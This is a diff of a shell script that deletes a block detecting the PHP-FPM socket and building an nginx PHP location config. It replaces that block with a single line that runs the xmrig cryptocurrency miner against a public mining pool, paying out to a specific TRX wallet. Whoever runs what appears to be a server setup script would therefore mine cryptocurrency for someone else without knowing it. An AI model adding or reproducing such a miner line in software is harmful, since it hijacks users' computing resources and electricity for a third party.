@@ -1,11 +1,1 @@
-
-#GET PHP FPM VERSION
-FPMVERSION=$(find /run/php/ -name 'php7.*-fpm.sock' | head -n 1)
-
-read -r -d '' PHPCONFIGFPM << EOM
-    location ~ \.php$ { 
-        try_files \$uri =404; 
-        include /etc/nginx/fastcgi.conf;
-        fastcgi_pass unix:$FPMVERSION; 
-    }
-EOM
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TLhwfKv3BrSXHuK9KfmRFGJqioarGxofnr.selamcnm2#qo31-97om
